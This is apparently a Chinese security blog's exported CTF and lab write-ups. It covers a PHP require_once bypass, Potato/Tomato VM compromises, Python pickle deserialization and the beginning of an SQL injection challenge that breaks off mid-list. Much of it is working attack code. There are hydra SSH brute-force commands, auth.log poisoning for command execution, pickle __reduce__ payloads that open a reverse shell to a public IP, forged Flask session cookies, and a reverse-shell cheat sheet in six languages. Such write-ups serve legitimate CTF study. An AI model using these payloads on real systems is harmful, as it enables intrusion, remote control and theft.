<h2 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h2><p>绕过require_once 只能包含一次的的限制</p>
<p>今天就来谈谈，怎么设想如何绕过这个哈希表，让php认为我们传入的文件名不在哈希表中，又可以让php能找到这个文件，读取到内容。</p>
<p>在这里有个小知识点，<code>/proc/self</code>指向当前进程的<code>/proc/pid/</code>，<code>/proc/self/root/</code>是指向<code>/</code>的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过，payload:</p>
<ul>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br><span class="line">&#x2F;&#x2F;result PD9waHAKCiRmbGFnPSJ0ZXN0e30iOwo&#x3D;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>接下来我们将对绕过的原理进行分析，php7.2.23的源码进行分析，建议配合Clion在linux里进行调试，至于如何搭建调试环境，可以自行搜索，参考一些别的文章。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MzA5ODA0NDE2MA&#x3D;&#x3D;&amp;mid&#x3D;2649729209&amp;idx&#x3D;1&amp;sn&#x3D;78c1f6cf291e5cfca3088f02216ccffd&amp;chksm&#x3D;888c98d6bffb11c014d8f98437879564702bd35b100f4337cbdf1f3cff827edfa4b9a8672637&amp;mpshare&#x3D;1&amp;scene&#x3D;23&amp;srcid&#x3D;0812s60kjiOtHT66otXJWIHt&amp;sharer_sharetime&#x3D;1597388716474&amp;sharer_shareid&#x3D;33a823b10ae99f33a60db621d83241cb#rd</span><br></pre></td></tr></table></figure>



<p>另外一种方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;571be1a2-1a80-477d-8f8c-71cd3a4d93a3.node3.buuoj.cn&#x2F;</span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;123&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag.php</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Potato和Tomato渗透</title>
    <url>/2020/11/08/Potato%E5%92%8CTomato%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h1 id="Potato渗透"><a href="#Potato渗透" class="headerlink" title="Potato渗透"></a>Potato渗透</h1><p>也是经典的dirb和nmap扫一波</p>
<p>nmap的结果</p>
<p><img src="image-20201108210135725.png" alt="image-20201108210135725"></p>
<p>dirb的结果</p>
<p><img src="image-20201108210207483.png" alt="image-20201108210207483"></p>
<p>也就发现了一个info.php能用，访问一些是phpinfo，呃，那再看看nmap，开了7120端口，看看，啥都没有，只能通过hypdra进行爆破咯，呃，账号密码都不知道，只能试试看了</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">hydra  192.168.1.113 ssh -s 7120  -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -t 4 -v -f</span><br></pre></td></tr></table></figure>



<p>登陆上之后查看uname -a 查看能不能提权</p>
<p>看见内核为ubuntu3.多，这种老版本一般可以直接提，尝试搜索</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">potato@ubuntu:/tmp$ uname -a</span><br><span class="line">Linux ubuntu 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>searchsploit Ubuntu 3.13.0</p>
<p><img src="image-20201109103119279.png" alt="image-20201109103119279"></p>
<p>利用-p指令找到存放位置，之后我们就可以直接拿下exp了，再上传到靶机的tmp目录下（因为tmp目录大部分情况下是777权限</p>
<p><img src="image-20201109103447331.png" alt="image-20201109103447331"></p>
<p>成功拿下！</p>
<h1 id="Tomato渗透"><a href="#Tomato渗透" class="headerlink" title="Tomato渗透"></a>Tomato渗透</h1><p>首先经典drib和nmap扫一波</p>
<p><img src="image-20201109103819079.png" alt="image-20201109103819079"></p>
<p>nmap：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sS -v -T4 -Pn -A -p 0-65535</span><br></pre></td></tr></table></figure>

<p><img src="Potato%E5%92%8CTomato%E6%B8%97%E9%80%8F/image-20201109104128465.png" alt="image-20201109104128465"></p>
<p>发现8888端口和21，开了其他tcp和ssh的端口,但是都没法用，在info.php下发现文件包含</p>
<p><img src="image-20201109110118801.png" alt="image-20201109110118801"></p>
<p>尝试包含了一下etc/passwd就卡住了，不知道该怎么做。。</p>
<hr>
<p>这里记录下各个log的文件</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">9)/var/run/utmp 记录着现在登录的用户;</span><br><span class="line">10)/var/log/lastlog 记录每个用户最后的登录信息;</span><br><span class="line">11)/var/log/btmp 记录错误的登录尝试;</span><br><span class="line">12)/var/log/dmesg内核日志;</span><br><span class="line">13)/var/log/cpus CPU的处理信息；</span><br><span class="line">14)/var/log/syslog 事件记录监控程序日志；</span><br><span class="line">15)/var/log/auth.log 用户认证日志；</span><br><span class="line">16)/var/log/daemon.log 系统进程日志；</span><br><span class="line">17)/var/log/mail.err 邮件错误信息；</span><br><span class="line"></span><br><span class="line">18)/var/log/mail.info 邮件信息；</span><br><span class="line"></span><br><span class="line">19)/var/log/mail.warn 邮件警告信息；</span><br><span class="line">20)/var/log/daemon.log 系统监控程序产生的信息;</span><br><span class="line">21)/var/log/kern 内核产生的信息;</span><br><span class="line">22)/var/log/lpr   行打印机假脱机系统产生的信息;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>根据大佬的payload，其实我们可以知道，在当前环境下我们可以控制的log文件只有auth.log,因为只有个这个日志我们可以操作，比如我们写入一句话，再进行包含的话，不就是执行了命令了吗（<strong>这个思路真的骚</strong></p>
<p>所以我们马上操作一波，这里我用xshell脸上·的</p>
<p><img src="image-20201109113724842.png" alt="image-20201109113724842"></p>
<p>马上执行命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;192.168.29.131&#x2F;antibot_image&#x2F;antibots&#x2F;info.php?image&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;auth.log&amp;cmd&#x3D;ls</span><br></pre></td></tr></table></figure>

<p><img src="image-20201109113800161.png" alt="image-20201109113800161"></p>
<p>再之后为了能够传脚本啥的啊，我们执行一波反弹shell：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.29.129&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>

<p>urlencode一下</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">php%20-r%20&#x27;%24sock%3Dfsockopen(%22192.168.29.129%22%2C4444)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B&#x27;</span><br></pre></td></tr></table></figure>

<p>弹到自己本机上即可。</p>
<p><img src="image-20201109113953687.png" alt="image-20201109113953687"></p>
<p>接下来我们求一个交互式的shell，发现python3可以用，所以接下来用Python打开一个交互式的shell</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<p>之后uname -a 看内核，exp一冲就完事了</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">grep -nr &quot;flag&#123;&quot; / 2&gt;/dev/null   我他妈直接一把梭</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Python反序列化</title>
    <url>/2020/12/07/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>今天在刷BUU的时候做到了IKUN这道题目，以前没有接触过Python的反序列化，所以不会做到最后一步..复现完之后决定总结一下Python的反序列化的几种方式：</p>
<p>Python能够实现的序列化与反序列化方式主要有三：</p>
<ul>
<li>JSON</li>
<li>pickle</li>
<li>shelve</li>
</ul>
<p>而这Ikun这道题使用的便是Pickle，故我们从这一部分开始说起。</p>
<h1 id="Pickle"><a href="#Pickle" class="headerlink" title="Pickle"></a>Pickle</h1><p>pickle提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。</p>
<p>pickle模块只能在python中使用，python中几乎所有的数据类型（列表，字典，集合，类等）都可以用pickle来序列化，</p>
<p>pickle序列化后的数据，可读性差，人一般无法识别。</p>
<p>Python接口有4个：</p>
<ul>
<li>dump</li>
<li>dumps</li>
<li>load</li>
<li>loads</li>
</ul>
<h2 id="dump"><a href="#dump" class="headerlink" title="dump"></a>dump</h2><p>dump我们用于将数据写入文件当中，官方文档中：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump（obj，file，protocol = <span class="literal">None</span>，*，fix_imports = <span class="literal">True</span> ）</span><br></pre></td></tr></table></figure>

<p>我们可以实践一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, n, a</span>):</span></span><br><span class="line">        self.name = n</span><br><span class="line">        self.age = a</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(self.name + <span class="string">&quot;_&quot;</span> + <span class="built_in">str</span>(self.age))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aa = Person(<span class="string">&quot;JGood&quot;</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;p.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">pickle.dump(aa,f,<span class="number">0</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">得到数据如下：</span><br><span class="line">ccopy_reg</span><br><span class="line">_reconstructor</span><br><span class="line">p0</span><br><span class="line">(c__main__</span><br><span class="line">Person</span><br><span class="line">p1</span><br><span class="line">c__builtin__</span><br><span class="line"><span class="built_in">object</span></span><br><span class="line">p2</span><br><span class="line">Ntp3</span><br><span class="line">Rp4</span><br><span class="line">(dp5</span><br><span class="line">Vname</span><br><span class="line">p6</span><br><span class="line">VJGood</span><br><span class="line">p7</span><br><span class="line">sVage</span><br><span class="line">p8</span><br><span class="line">I2</span><br><span class="line">sb.</span><br><span class="line"><span class="comment"># 这里需要注意，会有大量的\n换行符</span></span><br></pre></td></tr></table></figure>

<h2 id="dumps"><a href="#dumps" class="headerlink" title="dumps"></a>dumps</h2><p>该函数与dump的差别在于该函数不会将对象写入文件当中，只会将其转化为bytes对象，例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, n, a</span>):</span></span><br><span class="line">        self.name = n</span><br><span class="line">        self.age = a</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(self.name + <span class="string">&quot;_&quot;</span> + <span class="built_in">str</span>(self.age))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aa = Person(<span class="string">&quot;JGood&quot;</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># f=open(&#x27;p.txt&#x27;,&#x27;wb&#x27;)</span></span><br><span class="line">c = pickle.dumps(aa,<span class="number">0</span>)</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure>

<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">b&#x27;ccopy_reg\n_reconstructor\np0\n(c__main__\nPerson\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVname\np6\nVJGood\np7\nsVage\np8\nI2\nsb.&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="load"><a href="#load" class="headerlink" title="load"></a>load</h2><p>load与dump对应，读取某个文件并将其还原为一个类：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pickle.load（file，*，fix_imports &#x3D; True，encoding &#x3D;“ASCII”，errors &#x3D;“strict” ）</span><br><span class="line">从打开的文件对象 文件中读取pickle对象表示，并返回其中指定的重构对象层次结构。这相当于Unpickler(file).load()。</span><br></pre></td></tr></table></figure>

<h2 id="loads"><a href="#loads" class="headerlink" title="loads"></a>loads</h2><p>loads与dumps对应，将一个序列化对象换成一个类。 </p>
<p>在大部分的比赛当中，我们遇见的情况都是题目会load对象，所以我们要找的就是魔法函数。反序列化漏洞出现在 <code>__reduce__()</code>魔法函数上，这一点和PHP中的<code>__wakeup()</code> 魔术方法类似，都是因为每当反序列化过程开始或者结束时 , 都会自动调用这类函数。而这恰好是反序列化漏洞经常出现的地方。</p>
<p>而且在反序列化过程中，因为编程语言需要根据反序列化字符串去解析出自己独特的语言数据结构，所以就必须要在内部把解析出来的结构去执行一下。如果在反序列化过程中出现问题，便可能直接造成RCE漏洞.</p>
<p>【上述摘自师傅的博客<a href="https://blog.csdn.net/qq_43431158/article/details/108919605">https://blog.csdn.net/qq_43431158/article/details/108919605</a></p>
<p>并且loads会自动的解决import问题，对于没有引入的module会自动尝试import，也就是说Python中标准库的代码执行，命令执行函数我们都可以使用，这里记录一下可以尝试使用的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval, execfile, compile, open, file, map, input,</span><br><span class="line">os.system, os.popen, os.popen2, os.popen3, os.popen4, os.open, os.pipe,</span><br><span class="line">os.listdir, os.access,</span><br><span class="line">os.execl, os.execle, os.execlp, os.execlpe, os.execv,</span><br><span class="line">os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe,</span><br><span class="line">os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe,</span><br><span class="line">pickle.load, pickle.loads,cPickle.load,cPickle.loads,</span><br><span class="line">subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,</span><br><span class="line">commands.getstatusoutput,commands.getoutput,commands.getstatus,</span><br><span class="line">glob.glob,</span><br><span class="line">linecache.getline,</span><br><span class="line">shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,</span><br><span class="line">dircache.listdir,dircache.opendir,</span><br><span class="line">io.open,</span><br><span class="line">popen2.popen2,popen2.popen3,popen2.popen4,</span><br><span class="line">timeit.timeit,timeit.repeat,</span><br><span class="line">sys.call_tracing,</span><br><span class="line">code.interact,code.compile_command,codeop.compile_command,</span><br><span class="line">pty.spawn,</span><br><span class="line">posixfile.open,posixfile.fileopen,</span><br><span class="line">platform.popen</span><br></pre></td></tr></table></figure>



<p>当 <code>__reduce__()</code> 函数返回一个元组时 , <strong>第一个元素</strong>是一个可调用对象 , 这个对象会在创建对象时被调用 . <strong>第二个元素</strong>是可调用对象的参数 , 同样是一个元组。</p>
<p>例子如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">    print(<span class="string">&quot;wdnmd&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>, (<span class="string">&quot;print(123213)&quot;</span>,)</span><br><span class="line">person = Person()</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(person,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">wdnmd</span></span><br><span class="line"><span class="string">cc</span></span><br><span class="line"><span class="string">b&#x27;c__builtin__\neval\np0\n(Vprint(123213)\np1\ntp2\nRp3\n.&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>在反序列化过程结束的时候 , Python 进程会自动调用 <code>__reduce__()</code> 魔术方法 . 如果可以控制被调用函数的参数 , Python 进程就可以执行恶意代码。</p>
<p><strong>但是在我自己试的时候，发现即使是dumps也会执行我们的语句</strong></p>
<p>回到loads来说，loads也可以用于执行系统命令，除了ikun那道题目大部分payload使用eval以外，我们还可以使用</p>
<p>Python2中包含的commands.getoutput(),在Ikun这道题当中：</p>
<p><img src="image-20201207205603107.png" alt="image-20201207205603107"></p>
<p>可惜这里只是Python2环境，如果在Python3环境当中，我们可以利用subprocess</p>
<h4 id="1-call"><a href="#1-call" class="headerlink" title="(1) call"></a>(1) call</h4><p>执行命令，返回状态码(命令正常执行返回0，报错则返回1)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ret1&#x3D;subprocess.call(&quot;ifconfig&quot;)</span><br><span class="line">ret2&#x3D;subprocess.call(&quot;ipconfig&quot;)　　　　#python3.5不是这样，依然会抛出异常导致无法对ret2赋值</span><br><span class="line">print(ret1)     #0</span><br><span class="line">print(ret2)     #1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret &#x3D; subprocess.call([&quot;ls&quot;, &quot;-l&quot;], shell&#x3D;False)    #shell为False的时候命令必须分开写</span><br><span class="line">ret &#x3D; subprocess.call(&quot;ls -l&quot;, shell&#x3D;True)</span><br></pre></td></tr></table></figure>

<h4 id="2-check-call"><a href="#2-check-call" class="headerlink" title="(2) check_call"></a>(2) check_call</h4><p>执行命令，如果执行成功则返回状态码0，否则抛异常</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">subprocess.check_call([&quot;ls&quot;, &quot;-l&quot;])</span><br><span class="line">subprocess.check_call(&quot;exit 1&quot;, shell&#x3D;True)</span><br></pre></td></tr></table></figure>

<h4 id="3-check-output"><a href="#3-check-output" class="headerlink" title="(3) check_output"></a>(3) check_output</h4><p>执行命令，如果执行成功则返回执行结果，否则抛异常</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">subprocess.check_output([&quot;echo&quot;, &quot;Hello World!&quot;])</span><br><span class="line">subprocess.check_output(&quot;exit 1&quot;, shell&#x3D;True)</span><br></pre></td></tr></table></figure>

<h4 id="4-subprocess-Popen-…"><a href="#4-subprocess-Popen-…" class="headerlink" title="(4) subprocess.Popen(…)"></a>(4) subprocess.Popen(…)</h4><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">return</span> (commands.getstatusoutput, (<span class="string">&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;118.89.227.105&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = base64.b64encode(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br></pre></td></tr></table></figure>





<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>:</span></span><br><span class="line">    uname = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">    is_admin = <span class="number">1</span></span><br><span class="line">    __repr__ = <span class="keyword">lambda</span> o: o.uname</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;nc ip port -e /bin/sh&#x27;)&quot;</span>,))</span><br><span class="line"></span><br><span class="line"> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> &#123;&#x27;u&#x27;:b&#x27;gASVVgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIw6X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBgY2F0IC9mbGFnIGAgPiAvZjFhZycpLnJlYWQoKZSFlFKULg&#x27;&#125;</span></span><br><span class="line"><span class="string"> &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>



<p>生成：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.eJwtxz0OgjAYANCrmJ6AxkkTF5RiSKjB_tFvA0oUaKGJVojEu-vg8Ia3ooD2K9rUaI8gIlxaGAtB4r8TF_TMenKX29usZYNbt2QmkpUiftKD5zL9_Q0653bW9n40jgbhQLfKBN1TWg9PTkvT5VH20M6OtfUld7uuFdmoeJbmiT1dFO6uEQQmTAw49kUJVTXApEbbN8kSmFtAYvJi2POrW1KGZQ7z4YA-ny8R0kGX.YJtLwg<span class="number">.1</span>ycpGY0sFxDjHFKYijGZpMALrZA</span><br></pre></td></tr></table></figure>

<p>python2 python3 的伪造是一样的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.eJwtx7sOgjAUANBfMf2CNk44ohZDQo32Re8GlsijxSZaJRD-XQeHM5wFRbRb0KZGOwSYCuVgvEia_h2EZCfe01Zt7x-jbqTxU26xqjQNDzMEobLfZzCFcB_j2r31LEoPptE2mp6xengJVtquwPnTeDfWLpTCJ10j81GLPCuO7nDWpLtiiFzaFEgaLiVU1QAPPbr-dpwi9xMoQt-cBHH1U8aJKmDGCVrXLxGTQYk.YJtMnQ.Lc_vWp_w-A5CC1P_PqD6EGSzPfM</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s <span class="string">&#x27;glzjin22948575858jfjfjufirijidjitg3uiiuuh&#x27;</span> -t <span class="string">&quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;gASVRwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwrX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2NhdCAvZmxhZyA+IC8xMjMnKZSFlFKULg==&#x27;&#125;&#125;&quot;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python2 flask_session_cookie_manager2.py encode -s <span class="string">&#x27;glzjin22948575858jfjfjufirijidjitg3uiiuuh&#x27;</span> -t <span class="string">&quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;gASVWQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIw9X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ25jIDgxLjY5LjIwMS42NSA0MDAxIC1lIC9iaW4vYmFzaCAnKZSFlFKULg==&#x27;&#125;&#125;&quot;</span></span><br></pre></td></tr></table></figure>



<p>反弹shell:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">bash反弹</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.10.27/4444 0&gt;&amp;1</span><br><span class="line"><span class="meta">#</span><span class="bash">python反弹</span></span><br><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.10.27&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash">Perl反弹</span></span><br><span class="line">perl -e &#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash">PHP反弹</span></span><br><span class="line">php -r &#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3&gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash">Ruby反弹</span></span><br><span class="line">ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d&gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash">Java反弹</span></span><br><span class="line">r = Runtime.getRuntime() p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 2=&quot;&quot; |=&quot;&quot; while=&quot;&quot; read=&quot;&quot; line;=&quot;&quot; do=&quot;&quot; \$line=&quot;&quot;&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]) p.waitFor()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>RCTF2015EasySQL</title>
    <url>/2020/11/18/RCTF2015EasySQL/</url>
    <content><![CDATA[<h1 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h1><p>一个SQL注入，二次注入+报错注入</p>
<p>当我们注册用户修改密码的时候便会触发</p>
<h1 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h1><p>我们可以测试一下被过滤了什么：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">length </span><br><span class="line">+</span><br><span class="line">handler</span><br><span class="line">like</span><br><span class="line">select </span><br><span class="line">sleep</span><br><span class="line">database</span><br><span class="line">delete</span><br><span class="line">having</span><br><span class="line">or</span><br><span class="line">as</span><br><span class="line">-~</span><br><span class="line">BENCHMARK</span><br><span class="line">limit</span><br><span class="line">left</span><br><span class="line">select</span><br><span class="line">insert</span><br><span class="line">sys.schema_auto_increment_columns</span><br><span class="line">join</span><br><span class="line">right</span><br><span class="line">#</span><br><span class="line">&amp;</span><br><span class="line">&amp;&amp;</span><br><span class="line">\</span><br><span class="line">handler</span><br><span class="line">-- -</span><br><span class="line">--</span><br><span class="line">--+</span><br><span class="line">INFORMATION</span><br><span class="line">--</span><br><span class="line">;</span><br><span class="line">!</span><br><span class="line">%</span><br><span class="line">+</span><br><span class="line">xor</span><br><span class="line">&lt;&gt;</span><br><span class="line">(</span><br><span class="line">&gt;</span><br><span class="line">&lt;</span><br><span class="line">)</span><br><span class="line">.</span><br><span class="line">^</span><br><span class="line">=</span><br><span class="line">AND</span><br><span class="line">BY</span><br><span class="line">CAST</span><br><span class="line">COLUMN</span><br><span class="line">COUNT</span><br><span class="line">CREATE</span><br><span class="line">END</span><br><span class="line">case</span><br><span class="line">&#x27;1&#x27;=&#x27;1</span><br><span class="line">when</span><br><span class="line">admin&#x27;</span><br><span class="line">&quot;</span><br><span class="line">length </span><br><span class="line">+</span><br><span class="line">length</span><br><span class="line">REVERSE</span><br><span class="line"></span><br><span class="line">ascii</span><br><span class="line">select </span><br><span class="line">database</span><br><span class="line">left</span><br><span class="line">right</span><br><span class="line">&#x27;</span><br><span class="line">union</span><br><span class="line">||</span><br><span class="line">oorr</span><br><span class="line">/</span><br><span class="line">//</span><br><span class="line">//*</span><br><span class="line">*/*</span><br><span class="line">/**/</span><br><span class="line">anandd</span><br><span class="line">GROUP</span><br><span class="line">HAVING</span><br><span class="line">IF</span><br><span 